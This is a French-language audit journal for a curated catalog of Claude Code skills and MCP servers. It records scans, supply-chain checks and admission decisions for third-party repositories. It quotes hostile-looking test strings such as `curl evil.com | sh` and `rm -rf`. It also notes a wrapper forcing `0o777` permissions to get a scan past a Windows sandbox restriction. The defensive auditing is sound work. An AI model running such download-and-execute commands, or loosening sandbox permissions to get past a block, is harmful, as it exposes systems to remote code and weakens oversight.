ignorés. Les HIGH se concentrent là où l'outil analyse et réécrit des commandes
(`src/hooks/hook_cmd.rs` 77, `src/hooks/permissions.rs` 44) et dans les tests : chaînes `rm -rf`,
listes de variables secrètes à masquer, données de test (`hunter2`, `curl evil.com | sh`). Lu en
particulier : **le hook ne contourne pas les permissions de Claude Code.**
`process_claude_payload_from_decision` ne renvoie `permissionDecision: "allow"` que pour une règle
d'autorisation que l'humain a lui-même configurée ; sinon la commande est réécrite sans décision
et la demande de confirmation habituelle s'affiche ; une règle d'interdiction bloque la
réécriture. Nuance : une règle `allow` pour `git status` couvre aussi `rtk git status`, qui
l'enveloppe. Les « Supply Chain » sur `.claude/hooks/*.sh` visent des hooks de développement du
dépôt de `rtk`, que `rtk init` n'installe pas : il installe `rtk hook claude`, le binaire lui-même.
Aucun code malveillant.

**`claude-quickstarts`, trouvé grâce aux manifestes désormais remis au scanner** : deux démos
(`customer-support-agent`, `financial-data-analyst`) figent Next.js 14.2.5 et 14.2.15, chacun visé
par 16 avis publiés selon OSV, dont une exécution de code à distance dans l'API d'optimisation
d'images. Pas malveillant, mais hérité par quiconque bâtit dessus : précaution ajoutée aux deux
README, section du `stock`.

## 2026-10-12 — Audit : `rea` écarté pour l'instant

Candidats tirés des 24 étoiles ajoutées par l'humain les 2026-10-09 et 2026-10-11, triés sur leur
README. Seize sont des applications auto-hébergées (holm, laranode, cmms, worklenz…), hors
périmètre : ni skills ni outils d'agent. Sept outils d'agent ont été lus, mais ne sont pas audités
(ai-memory, context-mode, ai-factory, hindsight, colibri, RuView, tinyfish-cookbook). Un seul
a été audité à la demande : `rea`.

**Écarté : `rea`** (`morluto/rea`, MIT). C'est un serveur MCP de rétro-ingénierie (binaires,
Electron, .NET, APK, sites web) qui s'appuie sur Ghidra, IDA ou Hopper, et qui installe en plus
une skill, `reverse-engineer-anything`.
- **Méthode.** Clone de `main` à `c22111e` (2026-10-12). `python scripts/scan.py`, avec
  Skillspector 2.11.2 en `--no-llm`. Lecture du code de l'installeur et des appels réseau.
  Lecture, sans exécution, du tarball npm `rea-agents@6.4.0` : son `gitHead` est `a56f7bb`, et
  son sha512 a été vérifié contre le registre. Rien du projet n'a été exécuté.
- **Scan.** 2567 fichiers en 4 unités. 1203 constats sur des exécutables ou des manifestes
  (10 CRITICAL, 79 HIGH), lus un par un : faux positifs ou comportement documenté (`exec()` sur
  des fichiers du paquet, un `curl | bash` en commentaire). Aucun code malveillant trouvé.
  Deux limites : la couverture complète n'est que de 9 fichiers, par le mécanisme décrit dans
  l'entrée précédente, et `api.osv.dev` n'a pas répondu, donc **les dépendances vulnérables n'ont
  pas été vérifiées**.
- **Ce qui a décidé :**
  - **Le code exécuté n'est pas celui qu'on inspecte.** Le paquet npm contient du JavaScript
    compilé et un binaire Windows précompilé, absents du dépôt. `main` a 259 commits d'avance
    sur la release npm.
  - **L'épinglage est contourné.** La skill demande `npx -y rea-agents@latest` quand le CLI
    manque (`SKILL.md`, l. 34-35).
  - **Le rythme rend tout épinglage caduc en quelques jours.** 1658 commits en 7 jours,
    9 releases en 8 jours, dont 3 changements de version majeure. `SECURITY.md` ne corrige que la
    dernière version.
  - **`rea setup` est global.** Il écrit `mcpServers.rea` dans `~/.claude.json` et copie la
    skill dans `~/.claude/skills/`. Il n'installe toutefois ni hook ni permission.
  - **Le support Windows est faible.** Ghidra n'y est qu'expérimental et la capture de processus
    y est indisponible. Les outils d'exécution de cibles et d'ADB n'ont d'autre garde-fou que
    l'approbation de Claude Code (« This is not a sandbox »).
- **Recoupements avec `Anthropic-Cybersecurity-Skills`.** Le tri a suivi la chaîne Laya, puis
  Jev, puis l'agent, au seuil de 0,85. Laya s'est abstenu sur les 5 paires. Jev retient une
  concurrence avec les skills jadx et binwalk (0,85). L'agent la retient pour Ghidra. Deux paires
  restent indécises (JavaScript, dnSpy) et sont sans objet tant que `rea` est écarté.
- **Pour une réouverture.** Épingler le commit de la release npm, pas `main`, et le scanner avec
  OSV joignable. Enregistrer le serveur à la main, en portée projet et à version exacte
  (`claude mcp add --scope local rea -- cmd /d /c npx -y rea-agents@<version> mcp`), jamais avec
  `rea setup`. Ne pas lier la skill. Utilisable dès maintenant ponctuellement, hors catalogue,
  aux mêmes conditions.

**Chiffres** : inchangés. 26 lignes au catalogue, 2939 fichiers `SKILL.md`. Le clone
`mes_depots/rea` est hors catalogue et n'entre dans aucun compte.

## 2026-10-14 — `scripts/scan.py` voit enfin le C et le C++

**Le défaut.** `EXEC_EXT`, la liste des extensions que `scan.py` remet à Skillspector hors des
dossiers de skills, contenait Rust, Go et C#, mais ni `.c` ni `.h`. Constaté pendant l'audit de
`DeusData/codebase-memory-mcp` (moteur natif en C) : ses 861 `.c` et 706 `.h`, c'est-à-dire tout
ce qui compose son binaire, n'ont pas été remis au scanner. Seuls les scripts et manifestes l'ont
été (305 fichiers, 90 % inspectés entièrement), ce qui donnait une couverture trompeuse. La
lecture humaine des zones sensibles avait compensé ; le scan, non.

**Le correctif.** `EXEC_EXT` ajoute C, C++ et Objective-C (`.c`, `.h`, `.cc`, `.cpp`, `.cxx`,
`.hpp`, `.hh`, `.hxx`, `.m`, `.mm`), et les autres langages qu'un dépôt d'outils peut livrer
(`.java`, `.kt`, `.swift`, `.rb`, `.php`, `.lua`, `.zig`, `.zsh`, `.psm1`, `.vbs`). La liste de
`scripts/check.py`, qui ne concerne que les fichiers livrés dans `curation/`, est inchangée.

**Mesure.** Un dépôt d'essai jetable, un `main.c` contenant un `system("curl … | sh")` en simple
texte et un `main.h`, rien compilé ni exécuté. Ancienne version : 0 fichier, 0 constat. Nouvelle :
2 fichiers entièrement inspectés, 1 constat HIGH « Supply Chain » à `src/main.c:3`. Skillspector
analyse donc bien le C qu'on lui remet. 39 contrôles, 0 échec.

**Non fait.** `codebase-memory-mcp` n'a pas été rescanné avec la nouvelle liste ; à faire avant
toute décision d'admission.

## 2026-10-14 — Audit : `codegraph` ajouté en `manual`, `codebase-memory-mcp` écarté

Deux concurrents de graphify, repérés le 2026-10-12 parmi six outils de graphe de code
(GitNexus écarté d'office : licence PolyForm Noncommercial), audités en parallèle avec les mêmes
rubriques pour que l'humain choisisse. Méthode de rtk et rea : clone au commit de la release,
`scripts/scan.py`, lecture du code sensible (installeur, réseau, télémétrie, serveur, hooks),
artefacts téléchargés et vérifiés sans être exécutés. Recoupements par Laya
(`min_confidence=0.85`), puis Jev, puis l'agent.

**Ajouté : `codegraph`** (`mcp`, `manual`, `6560052`, MIT, Colby Mchenry) — un index vivant du
code source, resynchronisé à chaque modification, servi par MCP.
- **Code exécuté et code inspecté.** Tag `v1.6.2` = `gitHead` du paquet npm. Attestation de
  provenance GitHub vérifiée (`gh attestation verify`, source `0f0af7b`, parent de `6560052`
  qui ne touche que `CHANGELOG.md`), signatures npm vérifiées. **JavaScript recompilé avec tsc
  5.9.3 : 261 fichiers sur 261 identiques au paquet livré.** Seul le moteur Rust
  (`codegraph-kernel.node`, non signé) repose sur la seule attestation ; `node.exe` est signé
  par l'OpenJS Foundation. Aucun script npm de cycle de vie.
- **Réserves, vérifiées dans le code.** Télémétrie **activée par défaut**
  (`src/telemetry/index.ts`, `decidedBy: 'default'`), avertissement sur stderr seulement.
  L'installeur écrit en portée utilisateur, autorise `mcp__codegraph__*` sans demander, ajoute
  un hook `UserPromptSubmit` et un bloc `~/.claude/CLAUDE.md`, sans aperçu ; `codegraph
  upgrade` remet le hook. D'où l'installation à la main de `SETUP.md` étape 5b : portée
  projet, version exacte, télémétrie et vérification de mise à jour coupées, ni hook ni
  autorisation automatique.
- **Scan** (avec la liste corrigée le même jour) : 1 018 fichiers en 3 unités, couverture
  complète 0 % (1 015 partiels, même mécanisme de dégradation que le 2026-10-11), 3 `parser.c`
  de plus de 1 Mo écartés. 0 CRITICAL, 123 HIGH, 149 MEDIUM, 24 LOW sur exécutables. Les HIGH du
  code livré, lus un par un : écriture documentée des configurations d'agents, la commande
  `upgrade`, un `curl | sh` en commentaire. Les fichiers C ajoutent 26 MEDIUM, aucun HIGH
  (grammaires tree-sitter vendorées). Aucun code malveillant.
- **Concurrence avec graphify** : Laya, 0,88 au-dessus du seuil — la skill de graphify et les
  instructions du serveur codegraph réclament toutes deux « explorer avant de lire ».
  **Décision de l'humain** : partage par nature de fichier. graphify est la *carte*, à la
  demande, sur la documentation (specs, ADR, docs, PDF) et parfois sur tout le projet,
  installé par `graphify install` seul, sans hook (`graphify claude install` et
  `graphify install --project` en posent un : lu dans `graphify/install.py`). codegraph est
  l'*outil de requête* sur le code de l'application pendant qu'on code. Les fichiers de mise
  en route (`CLAUDE.md`, `AGENTS.md`, `STATE.md`, artefacts spec-kit) restent lus directement.
  Écrit dans `AGENTS.md` (étape 4 et tableau des concurrences) et dans le bloc de seuil de
  `SETUP.md`.
- Les 2 `SKILL.md` de son `.claude/skills/` servent au développement de codegraph : comptés,
  jamais liés.

**Écarté : `codebase-memory-mcp`** (`DeusData`, MIT, `v0.11.0` = `8972ea6`), décision de l'humain
sur ces constats. Sa chaîne de release est bonne (attestation SLSA vérifiée, désignant le commit
épinglé) et il n'a aucun appel sortant en production. Mais : binaire de 301 Mo non signé ;
interface web locale sans authentification, active par défaut (liaison `127.0.0.1` vérifiée) ;
installeur global (hooks sur Grep, Glob, Bash et Read, skill, trois agents, PATH) ;
**stabilité Windows douteuse** — 125 tickets ouverts dont un écran bleu (#2021) et un PATH
utilisateur effacé par l'installeur (#2045) ; 937 commits d'avance de `main` sur la release.
C'est cet audit qui a révélé le défaut de `scan.py` corrigé dans l'entrée précédente ; le clone
`mes_depots/codebase-memory-mcp` est hors catalogue.

**Chiffres** : 27 lignes au catalogue ; fichiers `SKILL.md` aux commits épinglés, même méthode
(`git ls-tree`, nom exact) : 2939 + 2 = **2941**. 39 contrôles, 0 échec.

## 2026-10-18 — Audit : seize étoiles des 16, 17 et 18 octobre (constats, décisions en attente)

**Périmètre.** Les 9 étoiles du 16/10 et les 7 du 17–18/10, celles que l'humain a demandé
d'auditer. SHA relevés par `git ls-remote --symref` le 18/10 vers 13:40, clones `--depth 1`
dans `mes_depots/`, HEAD vérifié égal au SHA pour les 16. Lecture manuelle des manifestes, des
`SKILL.md`, des scripts exécutés à l'usage, des hooks, des écritures globales et des domaines
sortants, puis `scripts/scan.py` (Skillspector v2.11.2, `--no-llm`) sur 7 dépôts. Laya et Jev
n'étaient pas disponibles dans la session : les recoupements sont manuels, à recontrôler par la
chaîne habituelle si l'humain le souhaite.

**Aucun code malveillant** dans les 11 dépôts lus en profondeur. Les constats Skillspector sur
exécutables sont, comme les fois précédentes, des fixtures : tests qui **rejettent** `/etc/passwd`
et `../src/file.js`, `exec(compile(...))` d'exemples locaux, `{**os.environ}` passé à un
sous-processus de test, CSS et géométrie 3D lus comme des prompts. Les 5 CRITICAL de `manimgx`
sont tous des `exec()` de tests/docs ; les 29 HIGH de `diagram-design` sont tous dans les scripts
de test/dév, **zéro dans les 6 scripts livrés**.

**Admissions proposées (3).** `anatomy` (`e948829`, MIT) : skill d'illustrations isométriques,
153 fichiers, Chrome headless local pour ses vérifications, réseau seulement vers le dépôt de
galerie sur `--submit` explicite. `diagram-design` (`550fd66`, MIT) : 45 types de diagrammes,
plugin sans hook, scripts d'usage sans réseau ; la sortie charge Google Fonts, documenté, avec
option hors ligne. `security-audit-skill` (`c1c8a8c`, MIT) : audit défensif en 6 phases, markdown
plus deux validateurs `.cjs` sans dépendance, aucun réseau ; sans bac à sable OS il reste en
`needs_validation` au lieu d'exécuter la cible.

**Réserves (3).** `text-to-cad` (`c8dec1e`, MIT) : le manifeste épingle `cadgen==0.7.22`, mais le
code exécuté est le wheel PyPI, absent du dépôt ; télémétrie active par défaut ; premier lancement
qui télécharge le runtime. `logo-design-skill` (`0ecf52e`, MIT + notice marques) : 1 432 logos
réels que la licence MIT ne couvre pas, à ne pas redistribuer dans ce dépôt public ; une version
lite existe. `SwiftUI-Agent-Skill` (`ce32af1`, MIT) : 25 fichiers markdown, 0 constat au scan,
mais recoupement avec `swiftui-patterns` — à arbitrer (admettre avec la paire de concurrences, ou
écarter).

**Refus proposés (3).** `openfilm` (`5c2000b`, MIT) : le skill fait exécuter `npx -y openfilm@latest`,
le code exécuté n'est jamais le commit épinglé, et le premier lancement télécharge un Chromium ;
même classe que `hyperframes`. `billion-context` (`6d9620f`, MIT) : proxy avec cert-MITM pour
plusieurs clients, **mise à jour automatique active par défaut** (15 min – 48 h, politique
`auto-update-policy.json` récupérée anonymement, fail-open), 0.1.x ; non épinglable en pratique.
`xerj` (`09705bf`, Apache-2.0) : 200 Mo, second démon local, `xerj init` écrit MCP + skill, et il
double `graphify` + `codegraph` déjà choisis ; l'installeur vérifie le SHA-256 et échoue fermé,
mais ce n'est pas une raison d'ajouter un troisième indexeur.

**Hors périmètre (7).** `ghidra` (suite Java de rétro-ingénierie), `airllm` (inférence LLM),
`xtool` (chaîne de build iOS), `ts-rust` (port de `tsc`), `ascii` (bibliothèque web),
`manimgx` (moteur d'animation, brique d'application ; 0 constat dans `skills/manimgx/`),
`DeepSeek-Bot` (plugin DSH, v0.1.7 preview, droits élevés du bot principal).

**Couverture des scans.** `anatomy` 95/139 entièrement, `security-audit-skill` 16/20,
`SwiftUI-Agent-Skill` 19/19, `diagram-design` 363/380, `text-to-cad` 86/2 613 (une unité expirée
à 600 s), `xerj` 12/985 (une unité expirée), `manimgx` 1/1 190 (dégradation connue, 1 189
partiels). Les 9 autres dépôts n'ont pas été scannés : `logo-design-skill`, `openfilm`,
`billion-context`, `DeepSeek-Bot` et les cinq hors-périmètre. L'audit a été arrêté là pour
contenir le contexte de la session, pas parce que la couverture était suffisante.

**Piège à retenir.** `scripts/scan.py` échoue sous le bac à sable Windows : `tempfile.mkdtemp`
crée des dossiers en 0700 que le bac à sable refuse ensuite en écriture. Un wrapper forçant
`0o777` pour `tempfile.mkdtemp` fait passer le scan ; à intégrer au script si le problème se
reproduit. Ne pas `git grep` sur tout `mes_depots/` non plus : un grep sur `xerj` est tombé dans
des transcripts JSONL de `benchmarks/` et a déversé 14 Ko dans le contexte.

**Chiffres** : 16 dépôts épinglés, 7 scannés (2 partiellement), **0 ligne de catalogue ajoutée ou
retirée**. Les SHAs complets, le détail par dépôt et les quatre étapes de reprise sont dans
`audit-2026-10-18.md`, fichier de travail non versionné. Décisions d'admission en attente de
l'humain : rien n'est entré au catalogue, rien n'en est sorti.

## 2026-10-18 — Décisions : cinq dépôts intégrés (catalogue à 32, curation à 100)

**Décision de l'humain** sur l'audit ci-dessus : intégrer `anatomy`, `diagram-design`,
`security-audit-skill`, `text-to-cad` et `logo-design-skill`. L'entrée précédente disait
« 0 ligne ajoutée » ; celle-ci la complète, elle ne la réécrit pas.

**`text-to-cad` : inspection terminée, réserve levée.** Le wheel `cadgen==0.7.22` a été
téléchargé depuis PyPI et vérifié : SHA-256 `e1818b781343ca3fdcf5d96472825cb29e8590868a60514407728edcc19c72bf`,
conforme à l'API PyPI ; 300 fichiers, Python pur. Un seul service sortant,
`api.texttocad.dev` : télémétrie (`cadgen/analytics.py`) et vérification de version
quotidienne (`cadgen/updates.py`). La télémétrie est active par défaut après notification,
n'envoie ni chemin, ni prompt, ni message ; elle se coupe par `CADGEN_TELEMETRY=0` /
`DO_NOT_TRACK=1`, ou de façon persistante par `uvx --from cadgen==0.7.22 cadgen telemetry off`.
`CADGEN_UPDATE_CHECK=0` coupe le contrôle de version. Aucune chaîne téléchargement-exécution,
aucun auto-update : le manifeste épingle la version et `updates.py` se contente de proposer une
mise à jour. `SETUP.md` porte la commande de coupure. **Admis** avec cette réserve levée.

**`logo-design-skill` : réserve de marques assumée.** Le skill est versé avec sa bibliothèque
de 1 432 logos ; `TRADEMARKS.md` est copié à côté et `ATTRIBUTION.md` porte l'exception
explicite : la licence MIT ne couvre pas ces fichiers, inclus comme référence seulement.
Décision de l'humain ; à retirer si la redistribution devient un problème.

**Ce qui a changé.**
- `curation/skills/` : +16 skills — `anatomy`, `diagram-design`, `security-audit`, les 12 de
  `text-to-cad` (`bambu-labs`, `cad`, `dfam-check`, `dfm`, `dxf`, `engineering-drawing`,
  `gcode`, `sdf`, `sendcutsend`, `srdf`, `step-parts`, `urdf`) et `logo-design`. 84 → 100.
  Les tests et fixtures de développement ne sont pas copiés (`anatomy` : `tests/`, `evals/`,
  `*.test.mjs` ; `security-audit` : `*.test.cjs`) ; les fichiers d'exécution le sont.
- `catalog/repos.tsv` : 5 lignes en `skills` / `on-demand`, aux commits épinglés du 18/10.
  27 → 32 dépôts.
- `README` et `README.fr` : familles 19 + 81, catégorie « Design, diagrammes et CAO » (15),
  catalogue 32, 2958 `SKILL.md` aux commits épinglés, crédits 99 redistribués + 1 original.
- Les deux `CHEATSHEET` : section 4 à 100, Méthode à 19, nouvelle catégorie à 15.
- `AGENTS.md`, `SETUP.md`, `QUICKSTART` : mêmes chiffres ; `SETUP.md` porte la coupure de
  télémétrie.
- `ATTRIBUTION.md` : 5 sections, dont 4 au singulier ; `scripts/check.py` accepte désormais
  `skill` au singulier, et sa liste nominative des exécutables livrés passe de 1 à 76 fichiers.
- `scripts/check.py` : **44 contrôles, 0 échec**.

**Chiffres** : 100 skills (19 méthode + 81 applicatif), 32 dépôts, 2958 fichiers `SKILL.md`,
76 exécutables livrés sous `curation/`. 44 contrôles, 0 échec.

## 2026-10-18 — `SwiftUI-Agent-Skill` écarté

**Décision de l'humain** : ne pas intégrer `SwiftUI-Agent-Skill` (`ce32af1`, MIT). Le scan
était propre — 19 fichiers sur 19 inspectés, **0 constat** — et le skill est de bonne qualité,
mais il recouvre `swiftui-patterns` (architecture, état, navigation, performance) et les autres
skills Swift déjà présentes : deux descriptions qui se déclenchent sur « review SwiftUI » se
concurrencent, et l'ajout n'apportait pas de capacité nouvelle. Aucune ligne de catalogue,
aucun fichier copié. Le clone reste hors catalogue dans `mes_depots/SwiftUI-Agent-Skill`,
épinglé à `ce32af1`.

**Chiffres** : inchangés — 100 skills, 32 dépôts, 2958 `SKILL.md`. 44 contrôles, 0 échec.

## 2026-10-18 — L'annexe d'audit du 18/10 est versionnée

`audit-2026-10-18.md` entre au dépôt. Il porte les 16 SHA complets, la couverture des scans et
le détail par dépôt, que les entrées datées ci-dessus ne reprennent pas — sans lui, les dépôts
écartés ou hors périmètre ne sont plus reproductibles. L'entrée de constat disait « fichier de
travail non versionné » : c'était vrai sur le moment, ce ne l'est plus. Aucun autre changement.

**Chiffres** : inchangés — 100 skills, 32 dépôts, 2958 `SKILL.md`, 76 exécutables livrés.
44 contrôles, 0 échec.

---

## Avant de modifier ce fichier

Ajoute une entrée datée en bas, ne touche pas aux précédentes. Une entrée dit ce qui a
changé, **comment ça a été mesuré**, et ce qui a été décidé de ne pas faire. Un chiffre sans
sa méthode ne vaut rien six mois plus tard : c'est précisément pour ça que « 2808 fichiers de
skills » n'a jamais pu être reproduit.

Pour les contrôles automatiques qui remplacent désormais les recomptages à la main, voir
`python scripts/check.py` et [`AGENTS.md`](AGENTS.md) § « Checking the repository against
itself ».
